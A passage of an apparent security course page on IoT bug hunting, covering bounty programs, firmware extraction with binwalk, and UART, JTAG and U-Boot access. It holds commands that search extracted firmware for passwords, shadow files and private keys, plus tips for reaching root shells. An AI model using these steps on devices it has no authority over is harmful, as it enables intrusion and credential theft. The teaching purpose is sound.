@@ -1,0 +1,1315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 13: IoT &amp; Embedded Systems - Bug Hunting</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background: #0a0508; font-family: 'Georgia', 'Times New Roman', serif; color: #8a6a9a; line-height: 1.7; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(ellipse at 15% 40%, rgba(80, 40, 100, 0.08) 0%, transparent 50%), radial-gradient(ellipse at 85% 60%, rgba(60, 20, 80, 0.06) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        .scroll-progress { position: fixed; top: 0; left: 0; height: 3px; background: linear-gradient(90deg, #9333ea, #a855f7); z-index: 200; transition: width 0.1s linear; width: 0%; }
+        .module-header { background: rgba(10, 5, 15, 0.95); border-bottom: 1px solid rgba(100, 60, 130, 0.2); padding: 18px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-btn { background: rgba(80, 40, 100, 0.2); border: 1px solid rgba(100, 60, 130, 0.3); color: #9a7aaa; padding: 7px 14px; border-radius: 4px; font-size: 0.8rem; text-decoration: none; transition: all 0.3s ease; font-family: 'Georgia', serif; }
+        .back-btn:hover { background: rgba(100, 60, 130, 0.3); border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8; }
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+        .progress-bar-mini { width: 120px; height: 4px; background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden; }
+        .progress-bar-mini .fill { height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7); width: 0%; transition: width 0.5s ease; }
+        .module-content { max-width: 1100px; margin: 0 auto; padding: 40px; position: relative; z-index: 10; }
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+        .intro-icon { font-size: 3.5rem; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3)); }
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+        .stat-pill { padding: 8px 18px; background: rgba(60, 30, 80, 0.15); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em; }
+        .section { margin-bottom: 80px; opacity: 0; transform: translateY(30px); transition: opacity 0.6s ease, transform 0.6s ease; }
+        .section.visible { opacity: 1; transform: translateY(0); }
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+        .section-title { font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px; }
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+        .section-body h3 { color: #c4a0d8; font-size: 1.1rem; font-weight: 400; margin: 28px 0 16px; }
+        .standards-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.87rem; }
+        .standards-table th { background: rgba(40, 20, 60, 0.5); color: #c4a0d8; padding: 12px 16px; text-align: left; font-weight: normal; letter-spacing: 0.1em; font-size: 0.78rem; text-transform: uppercase; border-bottom: 1px solid rgba(100, 60, 130, 0.2); }
+        .standards-table td { padding: 12px 16px; color: #9a7aaa; border-bottom: 1px solid rgba(100, 60, 130, 0.08); vertical-align: top; }
+        .standards-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+        .standards-table .std-name { color: #c4a0d8; font-family: 'Courier New', monospace; font-size: 0.9rem; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; }
+        .badge-legacy { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-current { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-latest { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+        .badge-info { background: rgba(59, 130, 246, 0.15); color: #93c5fd; border: 1px solid rgba(59, 130, 246, 0.3); }
+        .concept-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; margin: 28px 0; }
+        .concept-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; transition: all 0.3s ease; }
+        .concept-card:hover { transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3); }
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+        .callout { border-radius: 8px; padding: 20px 24px; margin: 24px 0; display: flex; gap: 16px; align-items: flex-start; }
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+        .code-block { background: rgba(5, 2, 10, 0.8); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 6px; padding: 16px 20px; margin: 16px 0; font-family: 'Courier New', monospace; font-size: 0.84rem; color: #b090c0; overflow-x: auto; line-height: 1.6; white-space: pre-wrap; }
+        .code-block .kw { color: #a855f7; } .code-block .str { color: #86efac; } .code-block .comment { color: #6a4a7a; font-style: italic; } .code-block .flag { color: #fbbf24; } .code-block .cmd { color: #c4a0d8; }
+        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
+        .col-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; }
+        .col-card h3 { font-size: 1rem; color: #c4a0d8; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li { font-size: 0.88rem; color: #8a6a9a; padding: 6px 0; border-bottom: 1px solid rgba(100, 60, 130, 0.08); display: flex; align-items: flex-start; gap: 8px; }
+        .col-card li::before { content: none; }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+        .numbered-list { list-style: none; padding: 0; margin: 20px 0; counter-reset: step-counter; }
+        .numbered-list li { counter-increment: step-counter; padding: 12px 18px 12px 50px; margin-bottom: 8px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; position: relative; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; }
+        .numbered-list li::before { content: counter(step-counter, decimal-leading-zero); position: absolute; left: 16px; top: 12px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #9333ea; font-weight: bold; }
+        .discussion-section { background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 10px; padding: 30px; margin: 40px 0; }
+        .discussion-title { font-size: 1.1rem; color: #c4a0d8; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .prompt-list { list-style: none; padding: 0; }
+        .prompt-item { padding: 14px 18px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; display: flex; gap: 12px; }
+        .prompt-item::before { content: none; }
+        .prompt-num { color: #9333ea; font-size: 0.8rem; font-family: 'Courier New', monospace; flex-shrink: 0; padding-top: 2px; }
+        .detail-section { border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; margin: 12px 0; overflow: hidden; }
+        .detail-header { padding: 16px 20px; background: rgba(15, 8, 20, 0.6); cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s ease; user-select: none; }
+        .detail-header:hover { background: rgba(40, 20, 60, 0.5); }
+        .detail-header-left { display: flex; align-items: center; gap: 12px; }
+        .detail-header-icon { font-size: 1rem; opacity: 0.75; }
+        .detail-header-title { font-size: 0.95rem; color: #c4a0d8; }
+        .detail-header-subtitle { font-size: 0.75rem; color: #6a4a7a; margin-top: 2px; }
+        .detail-toggle { color: #7a5a8a; font-size: 0.8rem; transition: transform 0.3s ease; }
+        .detail-toggle.open { transform: rotate(180deg); }
+        .detail-body { display: none; padding: 20px 24px; background: rgba(10, 5, 15, 0.4); border-top: 1px solid rgba(100, 60, 130, 0.1); color: #9a7aaa; font-size: 0.9rem; line-height: 1.7; }
+        .detail-body.open { display: block; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px; margin: 20px 0; }
+        .tool-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 20px; transition: all 0.3s ease; }
+        .tool-card:hover { border-color: rgba(147, 51, 234, 0.3); }
+        .tool-name { font-size: 0.95rem; color: #c4a0d8; margin-bottom: 4px; font-family: 'Courier New', monospace; }
+        .tool-role { font-size: 0.68rem; color: #9333ea; letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 10px; }
+        .tool-desc { font-size: 0.84rem; color: #8a6a9a; line-height: 1.6; }
+        .completion-section { text-align: center; padding: 60px 40px; background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px; }
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+        .completion-btn { display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px; background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px; color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif; letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3); }
+        .completion-btn:hover { background: linear-gradient(135deg, #6d28d9, #7c3aed); box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px); }
+        .inline-code { font-family: 'Courier New', monospace; color: #c4a0d8; background: rgba(40, 20, 60, 0.3); padding: 1px 6px; border-radius: 3px; font-size: 0.88rem; }
+        blockquote { border-left: 3px solid rgba(147, 51, 234, 0.4); padding: 16px 24px; margin: 24px 0; background: rgba(15, 8, 20, 0.5); border-radius: 0 8px 8px 0; font-style: italic; color: #9a7aaa; font-size: 0.95rem; line-height: 1.7; }
+        blockquote cite { display: block; margin-top: 10px; font-style: normal; font-size: 0.78rem; color: #6a4a7a; letter-spacing: 0.1em; }
+        @media (max-width: 768px) { .module-header { padding: 15px 20px; } .module-content { padding: 20px; } .two-col { grid-template-columns: 1fr; } .concept-grid { grid-template-columns: 1fr; } .tool-grid { grid-template-columns: 1fr; } .intro-title { font-size: 1.8rem; } .section-title { font-size: 1.4rem; } }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">BH // Bug Hunting &middot; Module 13</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#9881;</div>
+        <h1 class="intro-title">IoT &amp; Embedded Systems</h1>
+        <div class="intro-meta">Bug Hunting &bull; Module 13 &bull; Hardware Attack Surface</div>
+        <p class="intro-subtitle">
+            The Internet of Things has expanded the attack surface of every organization that
+            deploys connected devices &mdash; from smart cameras and industrial sensors to
+            medical equipment and building automation systems. IoT security testing combines
+            skills from firmware reverse engineering, hardware hacking, wireless protocol
+            analysis, and traditional web application testing into a discipline that very few
+            researchers practice well. The devices themselves often run stripped-down Linux
+            distributions with minimal security controls, expose debug interfaces from the
+            factory, and communicate over wireless protocols with weak or nonexistent encryption.
+            This module builds the methodology for assessing IoT devices from firmware extraction
+            through wireless protocol exploitation to reporting vulnerabilities with real-world
+            impact.
+        </p>
+        <div class="module-stats">
+            <div class="stat-pill">Firmware Analysis</div>
+            <div class="stat-pill">UART &amp; JTAG</div>
+            <div class="stat-pill">BLE &amp; Zigbee</div>
+            <div class="stat-pill">MQTT</div>
+            <div class="stat-pill">Embedded Web Interfaces</div>
+            <div class="stat-pill">~30 min read</div>
+        </div>
+    </div>
+
+    <!-- Section 1: IoT Bug Bounty Programs -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128225;</span>
+            IoT Bug Bounty Programs
+        </h2>
+        <div class="section-body">
+            <p>
+                IoT bug bounty programs differ fundamentally from web application programs in their
+                scope, methodology, and disclosure expectations. Testing physical hardware introduces
+                considerations that do not exist in web testing: you may need to purchase the device
+                with your own funds, testing may require physical modifications that void warranties,
+                and findings may affect devices deployed in safety-critical environments like
+                hospitals or power grids. Despite these challenges, IoT bounty programs are among
+                the most rewarding for skilled researchers because the competition is thin and
+                the severity of findings tends to be high.
+            </p>
+
+            <h3>IoT-Specific Bounty Platforms</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Platform / Program</th>
+                        <th>Focus</th>
+                        <th>Typical Bounty</th>
+                        <th>Notes</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Bugcrowd IoT Programs</td>
+                        <td>Consumer and enterprise IoT devices</td>
+                        <td>$500 &ndash; $30,000</td>
+                        <td>Multiple manufacturers list IoT-specific programs</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">HackerOne Hardware</td>
+                        <td>Connected devices, automotive, medical</td>
+                        <td>$1,000 &ndash; $100,000</td>
+                        <td>Tesla, Sonos, and others run hardware programs here</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Tesla Bug Bounty</td>
+                        <td>Vehicle systems, infotainment, Autopilot</td>
+                        <td>$100 &ndash; $15,000</td>
+                        <td>Specific rules for vehicle testing, research vehicles available</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">CISA CVD</td>
+                        <td>ICS/SCADA, medical devices, critical infrastructure</td>
+                        <td>No bounty (CVD)</td>
+                        <td>Coordinated Vulnerability Disclosure for critical IoT</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Zero Day Initiative</td>
+                        <td>Routers, NAS, printers, IoT firmware</td>
+                        <td>Varies (acquisition)</td>
+                        <td>Purchases IoT vulnerabilities for Pwn2Own and disclosure</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Scope Considerations for IoT</h3>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3><span class="li-marker">&#9670;</span> Physical vs Remote Testing</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8250;</span> Physical testing requires purchasing the device</li>
+                        <li><span class="li-marker">&#8250;</span> Hardware modification may be necessary (soldering, UART)</li>
+                        <li><span class="li-marker">&#8250;</span> Remote testing targets cloud APIs and web interfaces</li>
+                        <li><span class="li-marker">&#8250;</span> Some programs provide test devices to top researchers</li>
+                        <li><span class="li-marker">&#8250;</span> Firmware downloads enable analysis without hardware</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3><span class="li-marker">&#9670;</span> Responsible Disclosure for IoT</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8250;</span> IoT patches take months (firmware update cycles)</li>
+                        <li><span class="li-marker">&#8250;</span> Many devices have no automatic update mechanism</li>
+                        <li><span class="li-marker">&#8250;</span> Safety-critical devices require coordinated disclosure</li>
+                        <li><span class="li-marker">&#8250;</span> CISA/ICS-CERT may need to be involved for industrial IoT</li>
+                        <li><span class="li-marker">&#8250;</span> Longer embargo periods are standard (90-180 days)</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">Safety-Critical Devices</div>
+                    <div class="callout-text">
+                        IoT vulnerabilities in medical devices, industrial control systems, and
+                        automotive components can have life-safety implications. If you discover
+                        a vulnerability in a pacemaker, an insulin pump, a building fire suppression
+                        system, or a vehicle control module, do not disclose it publicly under any
+                        circumstances before the manufacturer has released a patch. Work through
+                        CISA's ICS-CERT, the FDA (for medical devices), or the manufacturer's
+                        coordinated disclosure program. The stakes are fundamentally different
+                        from finding an XSS in a web application.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 2: Firmware Extraction & Analysis -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128190;</span>
+            Firmware Extraction &amp; Analysis
+        </h2>
+        <div class="section-body">
+            <p>
+                Firmware is the software that runs on embedded devices &mdash; typically a minimal
+                Linux distribution or a real-time operating system with the device's application
+                code, web server, configuration files, and sometimes an entire filesystem packed
+                into a single binary image. Extracting and analyzing firmware is the foundation
+                of IoT security research. A thorough firmware analysis can reveal hardcoded
+                credentials, backdoor accounts, encryption keys, vulnerable services, and the
+                entire architecture of the device's software stack before you ever connect to the
+                physical hardware.
+            </p>
+
+            <h3>Obtaining Firmware</h3>
+
+            <p>
+                Firmware can be obtained through several methods, ranging from trivial downloads
+                to hardware-level extraction. Always start with the easiest approach &mdash; many
+                manufacturers publish firmware updates on their support websites, making physical
+                extraction unnecessary.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128229;</div>
+                    <div class="concept-card-title">Manufacturer Downloads</div>
+                    <div class="concept-card-body">
+                        Check the manufacturer's support page for firmware update files. These are
+                        often <span class="inline-code">.bin</span>, <span class="inline-code">.img</span>,
+                        or <span class="inline-code">.zip</span> files. Some are encrypted, but many
+                        are plain filesystem images. Search Google for
+                        <span class="inline-code">site:manufacturer.com firmware download</span>.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128268;</div>
+                    <div class="concept-card-title">UART Shell Access</div>
+                    <div class="concept-card-body">
+                        Connect to the device's UART debug port to access a serial console. From
+                        a root shell, you can dump the firmware directly from flash memory using
+                        <span class="inline-code">dd</span> or read it from the filesystem. This
+                        requires identifying and soldering to UART pads on the PCB.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128204;</div>
+                    <div class="concept-card-title">SPI Flash Extraction</div>
+                    <div class="concept-card-body">
+                        Desolder or clip onto the SPI flash chip and read its contents directly
+                        using a programmer like a Bus Pirate, Flashrom-compatible adapter, or
+                        CH341A. This provides the raw firmware image regardless of any runtime
+                        protections the device implements.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128246;</div>
+                    <div class="concept-card-title">Network Capture</div>
+                    <div class="concept-card-body">
+                        Intercept firmware update traffic between the device and the manufacturer's
+                        update server. If the update is downloaded over HTTP or HTTPS without
+                        certificate pinning, the firmware image can be captured with a proxy.
+                    </div>
+                </div>
+            </div>
+
+            <h3>Firmware Analysis with Binwalk</h3>
+
+            <p>
+                Binwalk is the standard tool for analyzing firmware images. It scans binary files
+                for known file signatures &mdash; filesystem headers, compressed archives,
+                bootloader code, and embedded files &mdash; and can extract the contents
+                automatically. A typical IoT firmware image contains a bootloader (often U-Boot),
+                a Linux kernel, and a root filesystem (squashfs, JFFS2, or cramfs).
+            </p>
+
+            <div class="code-block"><span class="comment"># Scan firmware for embedded file signatures</span>
+<span class="cmd">binwalk</span> <span class="str">firmware.bin</span>
+
+<span class="comment"># Extract all identified components</span>
+<span class="cmd">binwalk</span> <span class="flag">-e</span> <span class="str">firmware.bin</span>
+
+<span class="comment"># Recursive extraction (extract within extracted files)</span>
+<span class="cmd">binwalk</span> <span class="flag">-eM</span> <span class="str">firmware.bin</span>
+
+<span class="comment"># Entropy analysis (detect encryption or compression)</span>
+<span class="cmd">binwalk</span> <span class="flag">-E</span> <span class="str">firmware.bin</span>
+<span class="comment"># Flat high entropy = likely encrypted</span>
+<span class="comment"># Varying entropy with drops = compressed filesystem regions</span></div>
+
+            <h3>Filesystem Analysis</h3>
+
+            <p>
+                Once the filesystem is extracted, the analysis follows a systematic pattern:
+                search for credentials, configuration files, web application code, startup
+                scripts, and cryptographic material. The filesystem of a typical IoT device
+                is remarkably transparent compared to a hardened server &mdash; developers
+                frequently leave debug scripts, default credentials, and API keys in the
+                firmware because they assume the binary is opaque to end users.
+            </p>
+
+            <div class="code-block"><span class="comment"># Search for hardcoded credentials</span>
+<span class="cmd">grep</span> <span class="flag">-rn</span> <span class="str">"password\|passwd\|pwd\|secret"</span> <span class="str">./squashfs-root/</span>
+
+<span class="comment"># Check /etc/shadow and /etc/passwd</span>
+<span class="cmd">cat</span> <span class="str">./squashfs-root/etc/shadow</span>
+<span class="cmd">cat</span> <span class="str">./squashfs-root/etc/passwd</span>
+
+<span class="comment"># Search for private keys and certificates</span>
+<span class="cmd">find</span> <span class="str">./squashfs-root/</span> <span class="flag">-name</span> <span class="str">"*.pem"</span> <span class="flag">-o -name</span> <span class="str">"*.key"</span> <span class="flag">-o -name</span> <span class="str">"*.crt"</span>
+
+<span class="comment"># Examine startup scripts for services and configuration</span>
+<span class="cmd">ls</span> <span class="str">./squashfs-root/etc/init.d/</span>
+<span class="cmd">cat</span> <span class="str">./squashfs-root/etc/init.d/rcS</span>
+
+<span class="comment"># Check for web application files</span>
+<span class="cmd">find</span> <span class="str">./squashfs-root/</span> <span class="flag">-name</span> <span class="str">"*.cgi"</span> <span class="flag">-o -name</span> <span class="str">"*.lua"</span> <span class="flag">-o -name</span> <span class="str">"*.php"</span>
+
+<span class="comment"># Look for hardcoded API endpoints and URLs</span>
+<span class="cmd">grep</span> <span class="flag">-rn</span> <span class="str">"http://\|https://\|api\.\|\.amazonaws\.com"</span> <span class="str">./squashfs-root/</span></div>
+
+            <h3>Entropy Analysis</h3>
+
+            <p>
+                Binwalk's entropy analysis (<span class="inline-code">-E</span> flag) visualizes the
+                randomness distribution across the firmware image. Regions of high, uniform entropy
+                indicate encryption or strong compression. Regions with structured entropy patterns
+                indicate filesystems, code, or data. A firmware image that shows flat high entropy
+                across its entirety is likely encrypted &mdash; you will need the decryption key
+                (often found in the bootloader or a previous firmware version) before analysis
+                can proceed.
+            </p>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div>
+                    <div class="callout-title">Firmware Emulation</div>
+                    <div class="callout-text">
+                        Tools like QEMU and Firmadyne can emulate extracted firmware images,
+                        allowing you to interact with the device's web interface and services
+                        without physical hardware. This is particularly valuable for testing
+                        command injection in web interfaces and API endpoints. Firmadyne
+                        automates the process of identifying the architecture (MIPS, ARM, etc.),
+                        setting up the QEMU environment, and configuring networking for the
+                        emulated device.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 3: Hardware Interfaces -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128268;</span>
+            Hardware Interfaces
+        </h2>
+        <div class="section-body">
+            <p>
+                Most embedded devices retain hardware debug interfaces from their development
+                and manufacturing process. UART serial ports, JTAG debug headers, and SPI/I2C
+                bus connections are frequently left accessible on production PCBs because removing
+                them adds cost to the manufacturing process. These interfaces provide direct
+                access to the device's internals &mdash; serial console shells, memory dumps,
+                and flash chip contents &mdash; bypassing any software-level security the device
+                implements.
+            </p>
+
+            <h3>UART Identification and Connection</h3>
+
+            <p>
+                UART (Universal Asynchronous Receiver-Transmitter) is the most common debug
+                interface on IoT devices. It provides a serial console that typically outputs
+                boot logs and, in many cases, drops directly to a root shell. Identifying UART
+                pads on a PCB requires visual inspection for groups of 3-4 exposed pads or pins,
+                often labeled TX, RX, GND, and VCC.
+            </p>
+
+            <div class="code-block"><span class="comment"># UART identification process:</span>
+<span class="comment"># 1. Open the device case and photograph the PCB</span>
+<span class="comment"># 2. Look for groups of 3-4 pads/pins (TX, RX, GND, VCC)</span>
+<span class="comment"># 3. Use a multimeter to identify GND (continuity with ground plane)</span>
+<span class="comment"># 4. Use a logic analyzer to identify TX (transmits data on boot)</span>
+<span class="comment"># 5. The remaining data pad is RX</span>
+
+<span class="comment"># Connect with a USB-to-UART adapter (FTDI, CP2102, etc.)</span>
+<span class="comment"># Common baud rates: 9600, 19200, 38400, 57600, 115200</span>
+
+<span class="comment"># Connect using screen</span>
+<span class="cmd">screen</span> <span class="str">/dev/ttyUSB0</span> <span class="flag">115200</span>
+
+<span class="comment"># Connect using minicom</span>
+<span class="cmd">minicom</span> <span class="flag">-D</span> <span class="str">/dev/ttyUSB0</span> <span class="flag">-b</span> <span class="str">115200</span>
+
+<span class="comment"># Auto-detect baud rate with baudrate.py</span>
+<span class="cmd">python3</span> <span class="str">baudrate.py</span> <span class="flag">-p</span> <span class="str">/dev/ttyUSB0</span></div>
+
+            <h3>What UART Reveals</h3>
+
+            <p>
+                A successful UART connection typically provides the complete boot sequence output,
+                including the bootloader (U-Boot) menu, kernel boot messages, and service
+                initialization. Many devices drop directly to a root shell without authentication.
+                Even when a login prompt appears, the credentials are frequently found in the
+                firmware's <span class="inline-code">/etc/shadow</span> file or are the
+                manufacturer's default credentials.
+            </p>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10004;</span>
+                <div>
+                    <div class="callout-title">U-Boot Interrupt</div>
+                    <div class="callout-text">
+                        Many devices use U-Boot as their bootloader. During the boot sequence,
+                        there is typically a brief window (1-3 seconds) where pressing a key
+                        (often Enter, Space, or a specific key combination) drops you into the
+                        U-Boot command prompt. From there, you can modify boot arguments, read
+                        flash memory, boot into single-user mode, or change the root password
+                        before the OS loads. Look for messages like "Hit any key to stop autoboot"
+                        during the boot output.
+                    </div>
+                </div>
+            </div>
+
+            <h3>JTAG Debugging</h3>
+
+            <p>
+                JTAG (Joint Test Action Group) provides a more powerful hardware debug interface
+                than UART. While UART gives you a serial console, JTAG provides processor-level
+                debugging &mdash; you can halt the CPU, read and write memory, set breakpoints,
+                and step through code instruction by instruction. JTAG access is the hardware
+                equivalent of attaching a debugger to a running process.
+            </p>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Interface</th>
+                        <th>Access Level</th>
+                        <th>Required Hardware</th>
+                        <th>Common Use in Bug Bounty</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">UART</td>
+                        <td>Serial console (shell access)</td>
+                        <td>USB-to-UART adapter ($5-15)</td>
+                        <td>Boot log capture, root shell access, credential discovery</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">JTAG</td>
+                        <td>Processor-level debugging</td>
+                        <td>JTAG adapter (J-Link, Bus Pirate) ($20-300)</td>
+                        <td>Memory extraction, firmware dumping, bypassing secure boot</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">SPI</td>
+                        <td>Flash chip read/write</td>
+                        <td>SPI programmer (CH341A, Bus Pirate) ($5-30)</td>
+                        <td>Direct firmware extraction from flash memory</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">I2C</td>
+                        <td>EEPROM and sensor access</td>
+                        <td>Logic analyzer or Bus Pirate ($10-30)</td>
+                        <td>Reading configuration EEPROMs, sensor calibration data</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>SPI Flash Reading</h3>
+
